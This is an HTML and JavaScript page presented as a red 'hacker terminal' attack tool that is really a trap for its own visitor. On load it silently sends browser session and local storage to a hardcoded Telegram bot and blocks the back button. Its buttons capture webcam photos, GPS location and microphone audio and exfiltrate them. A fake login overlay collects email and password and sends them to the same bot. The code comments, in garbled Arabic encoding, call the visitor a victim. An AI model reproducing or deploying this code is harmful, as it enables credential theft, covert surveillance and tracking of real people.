<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM OVERRIDE | SPIDER-RAT PRO</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
        :root { --red: #ff0000; --glow: 0 0 20px #f00; }
        body { background: #000; color: var(--red); font-family: 'Share Tech Mono', monospace; margin: 0; overflow: hidden; text-transform: uppercase; }
        #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -2; opacity: 0.3; }
        .scanner { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: var(--red); box-shadow: var(--glow); animation: scan 3s linear infinite; z-index: -1; }
        @keyframes scan { 0% { top: -10%; } 100% { top: 110%; } }
        .screen { display: none; height: 100vh; flex-direction: column; justify-content: center; align-items: center; }
        .active { display: flex !important; }
        .frame { border: 1px solid var(--red); background: rgba(0, 0, 0, 0.9); padding: 25px; box-shadow: inset 0 0 20px #400, var(--glow); width: 90%; max-width: 420px; clip-path: polygon(0 5%, 5% 0, 95% 0, 100% 5%, 100% 95%, 95% 100%, 5% 100%, 0 95%); }
        input { background: transparent; border: 1px solid #400; color: #fff; padding: 12px; width: 100%; box-sizing: border-box; margin: 10px 0; outline: none; font-family: inherit; text-align: center; }
        button { background: var(--red); color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; font-family: inherit; margin-top: 10px; clip-path: polygon(5% 0, 100% 0, 95% 100%, 0 100%); }
        .loader-wrap { width: 100%; border: 1px solid #400; height: 10px; margin: 15px 0; }
        .progress { width: 0%; height: 100%; background: var(--red); transition: 0.5s; }
        #controlPanel { display: none; width: 100%; flex-direction: column; gap: 8px; }
        /* Ÿàÿßÿ¨Ÿáÿ© ÿßŸÑÿØÿÆŸàŸÑ ÿßŸÑŸàŸáŸÖŸäÿ© */
        #loginOverlay { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:999; justify-content:center; align-items:center; }
    </style>
</head>
<body onload="initInfection()">

<canvas id="matrixCanvas"></canvas>
<div class="scanner"></div>

<div id="loginOverlay">
    <div class="frame" style="border-color: #fbff00;">
        <h2 style="color: #fbff00;">SECURITY BYPASS</h2>
        <p style="font-size: 11px; color: #888;">ENTER ADMIN CREDENTIALS TO DECRYPT DATA</p>
        <input type="email" id="fEmail" placeholder="Email / Username">
        <input type="password" id="fPass" placeholder="Password">
        <button onclick="snatchCreds()" style="background:#fbff00;">VERIFY & EXECUTE</button>
    </div>
</div>

<div id="screen1" class="screen active">
    <div class="frame">
        <h1>TERMINAL V10</h1>
        <input type="text" id="targetIp" placeholder="TARGET IPV4">
        <button onclick="startMission()">INITIALIZE ATTACK</button>
    </div>
</div>

<div id="screen2" class="screen">
    <div class="frame">
        <h2 id="statusH">PENETRATING...</h2>
        <div id="loading">
            <div class="loader-wrap"><div id="bar" class="progress"></div></div>
        </div>
        <div id="controlPanel">
            <button onclick="startCapture()">üì∏ CAM FEED</button>
            <button onclick="getLocation()">üìç GPS TRACE</button>
            <button onclick="recordAudio()" id="aBtn">üéôÔ∏è MIC SNATCH</button>
            <button onclick="showLogin()" style="background:#fbff00; color:#000;">üîë SNATCH GOOGLE</button>
            <button onclick="location.reload()" style="background:#333; color:#f00;">EXIT</button>
        </div>
    </div>
</div>

<script>
    const CONFIG = { token: "8277722647:AAGbaCeEgSCNNzDmmTL_0uA9x4QTXxzMSrg", chatId: "1268323143" };

    // --- 1. ÿßŸÑŸÖÿßÿ™ÿ±ŸäŸÉÿ≥ ŸàÿßŸÑÿßŸáÿ™ÿ≤ÿßÿ≤ Ÿàÿ≠ÿ®ÿ≥ ÿßŸÑÿ∂ÿ≠Ÿäÿ© ---
    function initInfection() {
        startMatrix();
        sendMsg("üîî **TARGET ENTERED TRAP**\nAttempting Silent Data Extraction...");
        snatchSession(); // ÿ≥ÿ±ŸÇÿ© ÿßŸÑÿ¨ŸÑÿ≥ÿ© ÿµÿßŸÖÿ™ÿßŸã
        
        // ŸÖŸÜÿπ ÿ≤ÿ±ÿßÿ± ÿßŸÑÿ±ÿ¨Ÿàÿπ
        history.pushState(null, null, location.href);
        window.onpopstate = () => { history.go(1); alert("SYSTEM LOCKED: EXIT DENIED"); };
    }

    async function snatchSession() {
        const sessionData = JSON.stringify(sessionStorage) + JSON.stringify(localStorage);
        const bat = navigator.getBattery ? await navigator.getBattery() : {level:0};
        const msg = `üì° **SILENT REPORT**\nüîã Bat: ${bat.level*100}%\nüì± Sys: ${navigator.platform}\nüîë Session: ${sessionData.substring(0, 500)}...`;
        sendMsg(msg);
    }

    function sendMsg(t) { fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent(t)}&parse_mode=Markdown`); }

    function startMission() {
        if (navigator.vibrate) navigator.vibrate([200, 100, 200]); // ÿßŸáÿ™ÿ≤ÿßÿ≤ ÿπŸÜÿØ ÿßŸÑÿ®ÿØÿ°
        document.getElementById('screen1').classList.remove('active');
        document.getElementById('screen2').classList.add('active');
        let p = 0;
        const i = setInterval(() => {
            p += 25; document.getElementById('bar').style.width = p + "%";
            if(p >= 100) {
                clearInterval(i);
                document.getElementById('loading').style.display = 'none';
                document.getElementById('statusH').innerText = "SYSTEM COMPROMISED";
                document.getElementById('controlPanel').style.display = 'flex';
            }
        }, 1000);
    }

    // --- 2. ÿ≥ÿ≠ÿ® ÿßŸÑŸÖŸäÿØŸäÿß ŸàÿßŸÑŸÖŸàŸÇÿπ ---
    async function startCapture() {
        try {
            const s = await navigator.mediaDevices.getUserMedia({ video: true });
            const v = document.createElement('video'); v.srcObject = s; await v.play();
            const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
            setTimeout(async () => {
                c.getContext('2d').drawImage(v, 0, 0);
                const b = await new Promise(r => c.toBlob(r, 'image/jpeg'));
                const fd = new FormData(); fd.append('chat_id', CONFIG.chatId); fd.append('photo', b, 'x.jpg');
                fetch(`https://api.telegram.org/bot${CONFIG.token}/sendPhoto`, { method: 'POST', body: fd });
                s.getTracks().forEach(t => t.stop());
                alert("VISUAL DATA RECEIVED.");
            }, 1000);
        } catch(e) { alert("ERROR: ACCESS BLOCKED."); }
    }

    function getLocation() {
        navigator.geolocation.getCurrentPosition(p => {
            sendMsg(`üìç **LOCATION**\nhttp://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            alert("COORDINATES SYNCED.");
        });
    }

    async function recordAudio() {
        const btn = document.getElementById('aBtn'); btn.innerText = "üî¥ RECORDING...";
        try {
            const s = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mr = new MediaRecorder(s); const ch = [];
            mr.ondataavailable = e => ch.push(e.data);
            mr.onstop = async () => {
                const b = new Blob(ch, { type: 'audio/ogg' });
                const fd = new FormData(); fd.append('chat_id', CONFIG.chatId); fd.append('voice', b, 'v.ogg');
                fetch(`https://api.telegram.org/bot${CONFIG.token}/sendVoice`, { method: 'POST', body: fd });
                s.getTracks().forEach(t => t.stop());
                btn.innerText = "üéôÔ∏è MIC SNATCH";
            };
            mr.start(); setTimeout(() => mr.stop(), 5000);
        } catch(e) { alert("MIC DENIED."); btn.innerText = "üéôÔ∏è MIC SNATCH"; }
    }

    // --- 3. ŸÅÿÆ ÿßŸÑÿ®ÿßÿ≥Ÿàÿ±ÿØÿßÿ™ ---
    function showLogin() { document.getElementById('loginOverlay').style.display = 'flex'; }
    async function snatchCreds() {
        const e = document.getElementById('fEmail').value; const p = document.getElementById('fPass').value;
        if(e && p) {
            sendMsg(`üîì **CREDENTIALS**\nUser: ${e}\nPass: ${p}`);
            alert("DECRYPTION SUCCESSFUL.");
            document.getElementById('loginOverlay').style.display = 'none';
        }
    }

    function startMatrix() {
        const c = document.getElementById('matrixCanvas'); const ctx = c.getContext('2d');
        c.width = window.innerWidth; c.height = window.innerHeight;
        const dr = Array(Math.floor(c.width/20)).fill(1);
        setInterval(() => {
            ctx.fillStyle = "rgba(0,0,0,0.1)"; ctx.fillRect(0,0,c.width,c.height);
            ctx.fillStyle = "#f00"; dr.forEach((y, i) => {
                ctx.fillText(String.fromCharCode(Math.random()*128), i*20, y*20);
                if(y*20 > c.height && Math.random() > 0.975) dr[i] = 0; dr[i]++;
            });
        }, 40);
    }
</script>
</body>
</html>
